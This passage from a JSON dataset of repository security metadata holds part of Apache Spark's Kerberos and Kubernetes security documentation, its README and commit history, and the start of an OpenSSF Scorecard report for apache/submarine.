Controls whether to obtain credentials for services when security is enabled.\n    By default, credentials for all supported services are retrieved when those services are\n    configured, but it's possible to disable that behavior if it somehow conflicts with the\n    application being run.\n  </td>\n  <td>2.3.0</td>\n</tr>\n<tr>\n  <td><code>spark.kerberos.access.hadoopFileSystems</code></td>\n  <td>(none)</td>\n  <td>\n    A comma-separated list of secure Hadoop filesystems your Spark application is going to access. For\n    example, <code>spark.kerberos.access.hadoopFileSystems=hdfs://nn1.com:8032,hdfs://nn2.com:8032,\n    webhdfs://nn3.com:50070</code>. The Spark application must have access to the filesystems listed\n    and Kerberos must be properly configured to be able to access them (either in the same realm\n    or in a trusted realm). Spark acquires security tokens for each of the filesystems so that\n    the Spark application can access those remote Hadoop filesystems.\n  </td>\n  <td>3.0.0</td>\n</tr>\n</table>\n\nUsers can exclude Kerberos delegation token renewal at resource scheduler. Currently it is only supported\non YARN. The configuration is covered in the [Running Spark on YARN](running-on-yarn.html#yarn-specific-kerberos-configuration) page.\n\n## Long-Running Applications\n\nLong-running applications may run into issues if their run time exceeds the maximum delegation\ntoken lifetime configured in services it needs to access.\n\nThis feature is not available everywhere. In particular, it's only implemented\non YARN and Kubernetes (both client and cluster modes).\n\nSpark supports automatically creating new tokens for these applications. There are two ways to\nenable this functionality.\n\n### Using a Keytab\n\nBy providing Spark with a principal and keytab (e.g. using `spark-submit` with `--principal`\nand `--keytab` parameters), the application will maintain a valid Kerberos login that can be\nused to retrieve delegation tokens indefinitely.\n\nNote that when using a keytab in cluster mode, it will be copied over to the machine running the\nSpark driver. In the case of YARN, this means using HDFS as a staging area for the keytab, so it's\nstrongly recommended that both YARN and HDFS be secured with encryption, at least.\n\n### Using a ticket cache\n\nBy setting `spark.kerberos.renewal.credentials` to `ccache` in Spark's configuration, the local\nKerberos ticket cache will be used for authentication. Spark will keep the ticket renewed during its\nrenewable life, but after it expires a new ticket needs to be acquired (e.g. by running `kinit`).\n\nIt's up to the user to maintain an updated ticket cache that Spark can use.\n\nThe location of the ticket cache can be customized by setting the `KRB5CCNAME` environment\nvariable.\n\n## Secure Interaction with Kubernetes\n\nWhen talking to Hadoop-based services behind Kerberos, it was noted that Spark needs to obtain delegation tokens\nso that non-local processes can authenticate. These delegation tokens in Kubernetes are stored in Secrets that are\nshared by the Driver and its Executors. As such, there are three ways of submitting a Kerberos job:\n\nIn all cases you must define the environment variable: `HADOOP_CONF_DIR` or\n`spark.kubernetes.hadoop.configMapName.`\n\nIt also important to note that the KDC needs to be visible from inside the containers.\n\nIf a user wishes to use a remote HADOOP_CONF directory, that contains the Hadoop configuration files, this could be\nachieved by setting `spark.kubernetes.hadoop.configMapName` to a pre-existing ConfigMap.\n\n1. Submitting with a $kinit that stores a TGT in the Local Ticket Cache:\n```bash\n/usr/bin/kinit -kt <keytab_file> <username>/<krb5 realm>\n/opt/spark/bin/spark-submit \\\n    --deploy-mode cluster \\\n    --class org.apache.spark.examples.HdfsTest \\\n    --master k8s://<KUBERNETES_MASTER_ENDPOINT> \\\n    --conf spark.executor.instances=1 \\\n    --conf spark.app.name=spark-hdfs \\\n    --conf spark.kubernetes.container.image=spark:latest \\\n    --conf spark.kubernetes.kerberos.krb5.path=/etc/krb5.conf \\\n    local:///opt/spark/examples/jars/spark-examples_<VERSION>.jar \\\n    <HDFS_FILE_LOCATION>\n```\n2. Submitting with a local Keytab and Principal\n```bash\n/opt/spark/bin/spark-submit \\\n    --deploy-mode cluster \\\n    --class org.apache.spark.examples.HdfsTest \\\n    --master k8s://<KUBERNETES_MASTER_ENDPOINT> \\\n    --conf spark.executor.instances=1 \\\n    --conf spark.app.name=spark-hdfs \\\n    --conf spark.kubernetes.container.image=spark:latest \\\n    --conf spark.kerberos.keytab=<KEYTAB_FILE> \\\n    --conf spark.kerberos.principal=<PRINCIPAL> \\\n    --conf spark.kubernetes.kerberos.krb5.path=/etc/krb5.conf \\\n    local:///opt/spark/examples/jars/spark-examples_<VERSION>.jar \\\n    <HDFS_FILE_LOCATION>\n```\n\n3. Submitting with pre-populated secrets, that contain the Delegation Token, already existing within the namespace\n```bash\n/opt/spark/bin/spark-submit \\\n    --deploy-mode cluster \\\n    --class org.apache.spark.examples.HdfsTest \\\n    --master k8s://<KUBERNETES_MASTER_ENDPOINT> \\\n    --conf spark.executor.instances=1 \\\n    --conf spark.app.name=spark-hdfs \\\n    --conf spark.kubernetes.container.image=spark:latest \\\n    --conf spark.kubernetes.kerberos.tokenSecret.name=<SECRET_TOKEN_NAME> \\\n    --conf spark.kubernetes.kerberos.tokenSecret.itemKey=<SECRET_ITEM_KEY> \\\n    --conf spark.kubernetes.kerberos.krb5.path=/etc/krb5.conf \\\n    local:///opt/spark/examples/jars/spark-examples_<VERSION>.jar \\\n    <HDFS_FILE_LOCATION>\n```\n\n3b. Submitting like in (3) however specifying a pre-created krb5 ConfigMap and pre-created `HADOOP_CONF_DIR` ConfigMap\n```bash\n/opt/spark/bin/spark-submit \\\n    --deploy-mode cluster \\\n    --class org.apache.spark.examples.HdfsTest \\\n    --master k8s://<KUBERNETES_MASTER_ENDPOINT> \\\n    --conf spark.executor.instances=1 \\\n    --conf spark.app.name=spark-hdfs \\\n    --conf spark.kubernetes.container.image=spark:latest \\\n    --conf spark.kubernetes.kerberos.tokenSecret.name=<SECRET_TOKEN_NAME> \\\n    --conf spark.kubernetes.kerberos.tokenSecret.itemKey=<SECRET_ITEM_KEY> \\\n    --conf spark.kubernetes.hadoop.configMapName=<HCONF_CONFIG_MAP_NAME> \\\n    --conf spark.kubernetes.kerberos.krb5.configMapName=<KRB_CONFIG_MAP_NAME> \\\n    local:///opt/spark/examples/jars/spark-examples_<VERSION>.jar \\\n    <HDFS_FILE_LOCATION>\n```\n# Event Logging\n\nIf your applications are using event logging, the directory where the event logs go\n(`spark.eventLog.dir`) should be manually created with proper permissions. To secure the log files,\nthe directory permissions should be set to `drwxrwxrwxt`. The owner and group of the directory\nshould correspond to the super user who is running the Spark History Server.\n\nThis will allow all users to write to the directory but will prevent unprivileged users from\nreading, removing or renaming a file unless they own it. The event log files will be created by\nSpark with permissions such that only the user and group have read and write access.\n\n# Persisting driver logs in client mode\n\nIf your applications persist driver logs in client mode by enabling `spark.driver.log.persistToDfs.enabled`,\nthe directory where the driver logs go (`spark.driver.log.dfsDir`) should be manually created with proper\npermissions. To secure the log files, the directory permissions should be set to `drwxrwxrwxt`. The owner\nand group of the directory should correspond to the super user who is running the Spark History Server.\n\nThis will allow all users to write to the directory but will prevent unprivileged users from\nreading, removing or renaming a file unless they own it. The driver log files will be created by\nSpark with permissions such that only the user and group have read and write access.\n",
        "project_all_labels": [
            "AVRO",
            "BLOCK MANAGER",
            "BUILD",
            "CONNECT",
            "CORE",
            "dependencies",
            "DEPLOY",
            "DOCS",
            "DOCUMENTATION",
            "DSTREAM",
            "DSTREAMS",
            "EXAMPLES",
            "GRAPH",
            "GRAPHX",
            "INFRA",
            "INPUT/OUTPUT",
            "java",
            "JAVA API",
            "javascript",
            "KUBERNETES",
            "MESOS",
            "ML",
            "MLLIB",
            "OPTIMIZER",
            "PANDAS API ON SPARK",
            "PROJECT INFRA",
            "PROTOBUF",
            "PYSPARK",
            "PYTHON",
            "R",
            "ruby",
            "SCHEDULER",
            "SHUFFLE",
            "SPARK CORE",
            "SPARK SHELL",
            "SPARK SUBMIT",
            "SPARKR",
            "SQL",
            "Stale",
            "STRUCTURED STREAMING",
            "TESTS",
            "WEB UI",
            "WINDOWS",
            "YARN"
        ],
        "README_content": "# Apache Spark\n\nSpark is a unified analytics engine for large-scale data processing. It provides\nhigh-level APIs in Scala, Java, Python, and R, and an optimized engine that\nsupports general computation graphs for data analysis. It also supports a\nrich set of higher-level tools including Spark SQL for SQL and DataFrames,\npandas API on Spark for pandas workloads, MLlib for machine learning, GraphX for graph processing,\nand Structured Streaming for stream processing.\n\n- Official version: <https://spark.apache.org/>\n- Development version: <https://apache.github.io/spark/>\n\n[![GitHub Actions Build](https://github.com/apache/spark/actions/workflows/build_main.yml/badge.svg)](https://github.com/apache/spark/actions/workflows/build_main.yml)\n[![PySpark Coverage](https://codecov.io/gh/apache/spark/branch/master/graph/badge.svg)](https://codecov.io/gh/apache/spark)\n[![PyPI Downloads](https://static.pepy.tech/personalized-badge/pyspark?period=month&units=international_system&left_color=black&right_color=orange&left_text=PyPI%20downloads)](https://pypi.org/project/pyspark/)\n\n\n## Online Documentation\n\nYou can find the latest Spark documentation, including a programming\nguide, on the [project web page](https://spark.apache.org/documentation.html).\nThis README file only contains basic setup instructions.\n\n## Building Spark\n\nSpark is built using [Apache Maven](https://maven.apache.org/).\nTo build Spark and its example programs, run:\n\n```bash\n./build/mvn -DskipTests clean package\n```\n\n(You do not need to do this if you downloaded a pre-built package.)\n\nMore detailed documentation is available from the project site, at\n[\"Building Spark\"](https://spark.apache.org/docs/latest/building-spark.html).\n\nFor general development tips, including info on developing Spark using an IDE, see [\"Useful Developer Tools\"](https://spark.apache.org/developer-tools.html).\n\n## Interactive Scala Shell\n\nThe easiest way to start using Spark is through the Scala shell:\n\n```bash\n./bin/spark-shell\n```\n\nTry the following command, which should return 1,000,000,000:\n\n```scala\nscala> spark.range(1000 * 1000 * 1000).count()\n```\n\n## Interactive Python Shell\n\nAlternatively, if you prefer Python, you can use the Python shell:\n\n```bash\n./bin/pyspark\n```\n\nAnd run the following command, which should also return 1,000,000,000:\n\n```python\n>>> spark.range(1000 * 1000 * 1000).count()\n```\n\n## Example Programs\n\nSpark also comes with several sample programs in the `examples` directory.\nTo run one of them, use `./bin/run-example <class> [params]`. For example:\n\n```bash\n./bin/run-example SparkPi\n```\n\nwill run the Pi example locally.\n\nYou can set the MASTER environment variable when running examples to submit\nexamples to a cluster. This can be spark:// URL,\n\"yarn\" to run on YARN, and \"local\" to run\nlocally with one thread, or \"local[N]\" to run locally with N threads. You\ncan also use an abbreviated class name if the class is in the `examples`\npackage. For instance:\n\n```bash\nMASTER=spark://host:7077 ./bin/run-example SparkPi\n```\n\nMany of the example programs print usage help if no params are given.\n\n## Running Tests\n\nTesting first requires [building Spark](#building-spark). Once Spark is built, tests\ncan be run using:\n\n```bash\n./dev/run-tests\n```\n\nPlease see the guidance on how to\n[run tests for a module, or individual tests](https://spark.apache.org/developer-tools.html#individual-tests).\n\nThere is also a Kubernetes integration test, see resource-managers/kubernetes/integration-tests/README.md\n\n## A Note About Hadoop Versions\n\nSpark uses the Hadoop core library to talk to HDFS and other Hadoop-supported\nstorage systems. Because the protocols have changed in different versions of\nHadoop, you must build Spark against the same version that your cluster runs.\n\nPlease refer to the build documentation at\n[\"Specifying the Hadoop Version and Enabling YARN\"](https://spark.apache.org/docs/latest/building-spark.html#specifying-the-hadoop-version-and-enabling-yarn)\nfor detailed guidance on building for a particular distribution of Hadoop, including\nbuilding for particular Hive and Hive Thriftserver distributions.\n\n## Configuration\n\nPlease refer to the [Configuration Guide](https://spark.apache.org/docs/latest/configuration.html)\nin the online documentation for an overview on how to configure Spark.\n\n## Contributing\n\nPlease review the [Contribution to Spark guide](https://spark.apache.org/contributing.html)\nfor information on how to get started contributing to the project.\n",
        "num_commits": 42618,
        "project_age_days": 3899,
        "project_created_at": "2014-02-25",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-30",
        "num_contributors": 340,
        "num_pull": 48671,
        "num_issues": 48671,
        "num_opening_issue": 236,
        "project_size(kB)": 474992,
        "num_stargazers": 39600,
        "num_watchers": 39600,
        "num_forks": 28279,
        "num_subscribers": 2018,
        "SecurityPolicy_created_at": "2014-03-07 00:27:50",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "dedf5aa91827f32736ce5dae2eb123ba4e244c3b",
                "url": "https://github.com/apache/spark/commit/dedf5aa91827f32736ce5dae2eb123ba4e244c3b",
                "date": "2024-09-24 14:40:58"
            },
            {
                "commit_id": "df0e34c5a1c30956cb16e8af5569ed72387b6fc3",
                "url": "https://github.com/apache/spark/commit/df0e34c5a1c30956cb16e8af5569ed72387b6fc3",
                "date": "2024-09-14 01:09:48"
            },
            {
                "commit_id": "4e69e16406296e17e0e52dc3fcb6ecf1540799d5",
                "url": "https://github.com/apache/spark/commit/4e69e16406296e17e0e52dc3fcb6ecf1540799d5",
                "date": "2024-08-04 23:49:07"
            },
            {
                "commit_id": "d8820a07eb82acd35a1c9d4ff6ee4f65fc6aac29",
                "url": "https://github.com/apache/spark/commit/d8820a07eb82acd35a1c9d4ff6ee4f65fc6aac29",
                "date": "2024-07-16 02:13:44"
            },
            {
                "commit_id": "f0563ef64c7f42df21b16ccaeb4cf1324ea720f9",
                "url": "https://github.com/apache/spark/commit/f0563ef64c7f42df21b16ccaeb4cf1324ea720f9",
                "date": "2024-06-21 13:07:37"
            },
            {
                "commit_id": "62bad5301f5f4be74635d05edb6063a09b769ca5",
                "url": "https://github.com/apache/spark/commit/62bad5301f5f4be74635d05edb6063a09b769ca5",
                "date": "2024-06-21 02:41:58"
            },
            {
                "commit_id": "c3cc38bae6e7055e98ab1703388a2048bfbec63b",
                "url": "https://github.com/apache/spark/commit/c3cc38bae6e7055e98ab1703388a2048bfbec63b",
                "date": "2024-04-11 19:40:09"
            },
            {
                "commit_id": "ecdb38e2d0592987991cde46081c4de9b3c0fe64",
                "url": "https://github.com/apache/spark/commit/ecdb38e2d0592987991cde46081c4de9b3c0fe64",
                "date": "2024-01-31 00:47:33"
            },
            {
                "commit_id": "9c9020ebafd88684d7f10a2b871f9bc14ebba8b4",
                "url": "https://github.com/apache/spark/commit/9c9020ebafd88684d7f10a2b871f9bc14ebba8b4",
                "date": "2023-12-07 01:58:51"
            },
            {
                "commit_id": "99b80a7f17e20b5ae7cd5add886dcf2ccaa8c4f2",
                "url": "https://github.com/apache/spark/commit/99b80a7f17e20b5ae7cd5add886dcf2ccaa8c4f2",
                "date": "2023-11-30 22:23:57"
            },
            {
                "commit_id": "bfcd2c47742d69632584f6bb3cf08a8bc3ca8c8c",
                "url": "https://github.com/apache/spark/commit/bfcd2c47742d69632584f6bb3cf08a8bc3ca8c8c",
                "date": "2023-11-08 03:16:33"
            },
            {
                "commit_id": "c5967310740e8a71c6b9d7ed4d7cc413582268c7",
                "url": "https://github.com/apache/spark/commit/c5967310740e8a71c6b9d7ed4d7cc413582268c7",
                "date": "2023-09-28 02:22:07"
            },
            {
                "commit_id": "46ebed2b3714c56661577336653f716a440f0c77",
                "url": "https://github.com/apache/spark/commit/46ebed2b3714c56661577336653f716a440f0c77",
                "date": "2023-09-22 12:36:39"
            },
            {
                "commit_id": "99337926496ac59bdb5c037ab6338bc0abc9c7a3",
                "url": "https://github.com/apache/spark/commit/99337926496ac59bdb5c037ab6338bc0abc9c7a3",
                "date": "2023-06-22 20:02:11"
            },
            {
                "commit_id": "958a7d594d44900b82a70658c105cc7142fff92e",
                "url": "https://github.com/apache/spark/commit/958a7d594d44900b82a70658c105cc7142fff92e",
                "date": "2023-04-21 17:21:35"
            },
            {
                "commit_id": "12b9b771c7ad75cb90c0a51cd2d0581dd3c719e2",
                "url": "https://github.com/apache/spark/commit/12b9b771c7ad75cb90c0a51cd2d0581dd3c719e2",
                "date": "2023-03-19 18:34:12"
            },
            {
                "commit_id": "a46abbc18d1874148f97b3035c553ffee8494811",
                "url": "https://github.com/apache/spark/commit/a46abbc18d1874148f97b3035c553ffee8494811",
                "date": "2022-04-02 16:40:39"
            },
            {
                "commit_id": "2e1e1f83e49f69e37229c65592c1a2e87b1efe56",
                "url": "https://github.com/apache/spark/commit/2e1e1f83e49f69e37229c65592c1a2e87b1efe56",
                "date": "2021-04-17 13:44:00"
            },
            {
                "commit_id": "95c61df0faed325b4d6912e3ca7c90e51a2a7eac",
                "url": "https://github.com/apache/spark/commit/95c61df0faed325b4d6912e3ca7c90e51a2a7eac",
                "date": "2021-03-24 08:11:53"
            },
            {
                "commit_id": "fc5d67fe224cc20128c79858c5c36744833cf1a6",
                "url": "https://github.com/apache/spark/commit/fc5d67fe224cc20128c79858c5c36744833cf1a6",
                "date": "2020-03-31 03:33:01"
            },
            {
                "commit_id": "f4cd7495f19028b0befd062d9730db973d0290bd",
                "url": "https://github.com/apache/spark/commit/f4cd7495f19028b0befd062d9730db973d0290bd",
                "date": "2020-03-16 01:08:07"
            },
            {
                "commit_id": "754f820035477f9538de6417cf68241b98ba82c6",
                "url": "https://github.com/apache/spark/commit/754f820035477f9538de6417cf68241b98ba82c6",
                "date": "2019-03-31 00:49:45"
            },
            {
                "commit_id": "28ced387b9ef0b4c9d3b72913b839786fa0bfa38",
                "url": "https://github.com/apache/spark/commit/28ced387b9ef0b4c9d3b72913b839786fa0bfa38",
                "date": "2019-02-15 22:43:13"
            },
            {
                "commit_id": "d0443a74d185ec72b747fa39994fa9a40ce974cf",
                "url": "https://github.com/apache/spark/commit/d0443a74d185ec72b747fa39994fa9a40ce974cf",
                "date": "2019-02-08 21:41:52"
            },
            {
                "commit_id": "2a67dbfbd341af166b1c85904875f26a6dea5ba8",
                "url": "https://github.com/apache/spark/commit/2a67dbfbd341af166b1c85904875f26a6dea5ba8",
                "date": "2019-01-28 21:32:34"
            },
            {
                "commit_id": "57d6fbfa8c803ce1791e7be36aba0219a1fcaa63",
                "url": "https://github.com/apache/spark/commit/57d6fbfa8c803ce1791e7be36aba0219a1fcaa63",
                "date": "2018-12-11 21:50:16"
            },
            {
                "commit_id": "dbd90e54408d593e02a3dd1e659fcf9a7b940535",
                "url": "https://github.com/apache/spark/commit/dbd90e54408d593e02a3dd1e659fcf9a7b940535",
                "date": "2018-12-06 22:17:13"
            },
            {
                "commit_id": "c3f27b2437497396913fdec96f085c3626ef4e59",
                "url": "https://github.com/apache/spark/commit/c3f27b2437497396913fdec96f085c3626ef4e59",
                "date": "2018-11-30 15:03:46"
            },
            {
                "commit_id": "5f11e8c4cb9a5db037ac239b8fcc97f3a746e772",
                "url": "https://github.com/apache/spark/commit/5f11e8c4cb9a5db037ac239b8fcc97f3a746e772",
                "date": "2018-11-14 16:23:34"
            },
            {
                "commit_id": "c00186f90cfcc33492d760f874ead34f0e3da6ed",
                "url": "https://github.com/apache/spark/commit/c00186f90cfcc33492d760f874ead34f0e3da6ed",
                "date": "2018-11-02 15:56:30"
            },
            {
                "commit_id": "6c9c84ffb9c8d98ee2ece7ba4b010856591d383d",
                "url": "https://github.com/apache/spark/commit/6c9c84ffb9c8d98ee2ece7ba4b010856591d383d",
                "date": "2018-10-15 22:48:51"
            },
            {
                "commit_id": "35f7f5ce83984d8afe0b7955942baa04f2bef74f",
                "url": "https://github.com/apache/spark/commit/35f7f5ce83984d8afe0b7955942baa04f2bef74f",
                "date": "2018-08-21 17:02:17"
            },
            {
                "commit_id": "10248758438b9ff57f5669a324a716c8c6c8f17b",
                "url": "https://github.com/apache/spark/commit/10248758438b9ff57f5669a324a716c8c6c8f17b",
                "date": "2018-08-14 18:02:33"
            },
            {
                "commit_id": "c9914cf0490d13820fb4081eb05188b4903eb980",
                "url": "https://github.com/apache/spark/commit/c9914cf0490d13820fb4081eb05188b4903eb980",
                "date": "2018-08-02 02:22:52"
            },
            {
                "commit_id": "33e77fa89b5805ecb1066fc534723527f70d37c7",
                "url": "https://github.com/apache/spark/commit/33e77fa89b5805ecb1066fc534723527f70d37c7",
                "date": "2018-06-22 17:14:12"
            },
            {
                "commit_id": "6ade5cbb498f6c6ea38779b97f2325d5cf5013f2",
                "url": "https://github.com/apache/spark/commit/6ade5cbb498f6c6ea38779b97f2325d5cf5013f2",
                "date": "2018-04-06 05:37:08"
            },
            {
                "commit_id": "b30a7d28b399950953d4b112c57d4c9b9ab223e9",
                "url": "https://github.com/apache/spark/commit/b30a7d28b399950953d4b112c57d4c9b9ab223e9",
                "date": "2018-03-26 19:45:45"
            },
            {
                "commit_id": "508573958dc9b6402e684cd6dd37202deaaa97f6",
                "url": "https://github.com/apache/spark/commit/508573958dc9b6402e684cd6dd37202deaaa97f6",
                "date": "2018-03-05 23:03:27"
            },
            {
                "commit_id": "c5abb3c2d16f601d507bee3c53663d4e117eb8b5",
                "url": "https://github.com/apache/spark/commit/c5abb3c2d16f601d507bee3c53663d4e117eb8b5",
                "date": "2018-02-22 20:07:51"
            },
            {
                "commit_id": "84a076e0e9a38a26edf7b702c24fdbbcf1e697b9",
                "url": "https://github.com/apache/spark/commit/84a076e0e9a38a26edf7b702c24fdbbcf1e697b9",
                "date": "2018-01-20 22:34:37"
            },
            {
                "commit_id": "5a07aca4d464e96d75ea17bf6768e24b829872ec",
                "url": "https://github.com/apache/spark/commit/5a07aca4d464e96d75ea17bf6768e24b829872ec",
                "date": "2017-10-19 07:33:14"
            },
            {
                "commit_id": "fc45c2c88a838b8f46659ebad2a8f3a9923bc95f",
                "url": "https://github.com/apache/spark/commit/fc45c2c88a838b8f46659ebad2a8f3a9923bc95f",
                "date": "2017-08-31 17:58:41"
            },
            {
                "commit_id": "ba186a841fcfcd73a1530ca2418cc08bb0df92e1",
                "url": "https://github.com/apache/spark/commit/ba186a841fcfcd73a1530ca2418cc08bb0df92e1",
                "date": "2017-03-03 22:23:31"
            },
            {
                "commit_id": "c5a66356d431dc07dbd44540a495264fb19bd5d9",
                "url": "https://github.com/apache/spark/commit/c5a66356d431dc07dbd44540a495264fb19bd5d9",
                "date": "2017-02-10 16:11:03"
            },
            {
                "commit_id": "3fc8e8caf81d0049daf9b776ad4059b0df81630f",
                "url": "https://github.com/apache/spark/commit/3fc8e8caf81d0049daf9b776ad4059b0df81630f",
                "date": "2017-02-09 13:06:46"
            },
            {
                "commit_id": "d50d12b49f98e18abd1c0b054b23a64fefd92ea2",
                "url": "https://github.com/apache/spark/commit/d50d12b49f98e18abd1c0b054b23a64fefd92ea2",
                "date": "2017-01-20 14:15:18"
            },
            {
                "commit_id": "53d1c7877967f03cc9c8c7e7394f380d1bbefc27",
                "url": "https://github.com/apache/spark/commit/53d1c7877967f03cc9c8c7e7394f380d1bbefc27",
                "date": "2016-08-08 23:07:51"
            },
            {
                "commit_id": "a45647746d1efb90cb8bc142c2ef110a0db9bc9f",
                "url": "https://github.com/apache/spark/commit/a45647746d1efb90cb8bc142c2ef110a0db9bc9f",
                "date": "2016-05-04 13:45:43"
            },
            {
                "commit_id": "bc1babd63da4ee56e6d371eb24805a5d714e8295",
                "url": "https://github.com/apache/spark/commit/bc1babd63da4ee56e6d371eb24805a5d714e8295",
                "date": "2016-01-23 05:20:04"
            },
            {
                "commit_id": "43f1d59e17d89d19b322d639c5069a3fc0c8e2ed",
                "url": "https://github.com/apache/spark/commit/43f1d59e17d89d19b322d639c5069a3fc0c8e2ed",
                "date": "2016-01-19 22:49:55"
            },
            {
                "commit_id": "ee8f8d318417c514fbb26e57157483d466ddbfae",
                "url": "https://github.com/apache/spark/commit/ee8f8d318417c514fbb26e57157483d466ddbfae",
                "date": "2015-12-31 02:07:07"
            },
            {
                "commit_id": "4a46b8859d3314b5b45a67cdc5c81fecb6e9e78c",
                "url": "https://github.com/apache/spark/commit/4a46b8859d3314b5b45a67cdc5c81fecb6e9e78c",
                "date": "2015-12-10 21:26:30"
            },
            {
                "commit_id": "c2467dadae8ce44010a912ee91c429310f8add65",
                "url": "https://github.com/apache/spark/commit/c2467dadae8ce44010a912ee91c429310f8add65",
                "date": "2015-11-23 21:54:19"
            },
            {
                "commit_id": "97a99dde6e8d69a4c4c135dc1d9b1520b2548b5b",
                "url": "https://github.com/apache/spark/commit/97a99dde6e8d69a4c4c135dc1d9b1520b2548b5b",
                "date": "2015-09-21 20:15:44"
            },
            {
                "commit_id": "b1f4ca82d170935d15f1fe6beb9af0743b4d81cd",
                "url": "https://github.com/apache/spark/commit/b1f4ca82d170935d15f1fe6beb9af0743b4d81cd",
                "date": "2015-05-01 20:32:09"
            },
            {
                "commit_id": "e0628f2fae7f99d096f9dd625876a60d11020d9b",
                "url": "https://github.com/apache/spark/commit/e0628f2fae7f99d096f9dd625876a60d11020d9b",
                "date": "2015-04-30 21:59:20"
            },
            {
                "commit_id": "6c65da6bb7d1213e6a4a9f7fd1597d029d87d07c",
                "url": "https://github.com/apache/spark/commit/6c65da6bb7d1213e6a4a9f7fd1597d029d87d07c",
                "date": "2015-04-30 18:03:23"
            },
            {
                "commit_id": "4d74f0601a2465b0d2273a8bcc716b304584831f",
                "url": "https://github.com/apache/spark/commit/4d74f0601a2465b0d2273a8bcc716b304584831f",
                "date": "2015-02-05 19:12:50"
            },
            {
                "commit_id": "cfea30037ff4ac7e386a1478e7dce07ca3bb9072",
                "url": "https://github.com/apache/spark/commit/cfea30037ff4ac7e386a1478e7dce07ca3bb9072",
                "date": "2015-02-03 01:27:26"
            },
            {
                "commit_id": "5e73138a0152b78380b3f1def4b969b58e70dd11",
                "url": "https://github.com/apache/spark/commit/5e73138a0152b78380b3f1def4b969b58e70dd11",
                "date": "2014-11-05 00:15:38"
            },
            {
                "commit_id": "09f7e4587bbdf74207d2629e8c1314f93d865999",
                "url": "https://github.com/apache/spark/commit/09f7e4587bbdf74207d2629e8c1314f93d865999",
                "date": "2014-08-06 07:07:40"
            },
            {
                "commit_id": "1c5555a23d3aa40423d658cfbf2c956ad415a6b1",
                "url": "https://github.com/apache/spark/commit/1c5555a23d3aa40423d658cfbf2c956ad415a6b1",
                "date": "2014-08-05 17:52:52"
            },
            {
                "commit_id": "c8bf4131bc2a2e147e977159fc90e94b85738830",
                "url": "https://github.com/apache/spark/commit/c8bf4131bc2a2e147e977159fc90e94b85738830",
                "date": "2014-05-30 07:34:33"
            },
            {
                "commit_id": "8db0f7e28f5f0330a3344705ff48d8e7b97c383f",
                "url": "https://github.com/apache/spark/commit/8db0f7e28f5f0330a3344705ff48d8e7b97c383f",
                "date": "2014-04-29 14:19:48"
            },
            {
                "commit_id": "7edbea41b43e0dc11a2de156be220db8b7952d01",
                "url": "https://github.com/apache/spark/commit/7edbea41b43e0dc11a2de156be220db8b7952d01",
                "date": "2014-03-07 00:27:50"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "not_mentioned",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "apache/submarine",
        "project_url": "https://github.com/apache/submarine",
        "SSF": {
            "date": "2024-10-30T04:08:20+07:00",
            "repo": {
                "name": "github.com/apache/submarine",
                "commit": "7a1d551798c6785fc68fe028fc46f74c3ee6976d"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 4.7,
            "checks": [
                {
                    "details": [
                        "Warn: binary detected: dev-support/submarine-installer/package/hadoop/yarn/lib/native/libgplcompression.a:1",
                        "Warn: binary detected: dev-support/submarine-installer/package/hadoop/yarn/lib/native/libgplcompression.so:1",
                        "Warn: binary detected: dev-support/submarine-installer/package/hadoop/yarn/lib/native/libgplcompression.so.0:1",
                        "Warn: binary detected: dev-support/submarine-installer/package/hadoop/yarn/lib/native/libgplcompression.so.0.0.0:1"
                    ],
                    "score": 6,
                    "reason": "binaries present in source code",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: branch 'master' does not require approvers",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Warn: no status checks found to merge onto branch 'master'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "7 out of 7 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 2,
                    "reason": "Found 6/30 approved changesets -- score normalized to 2",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
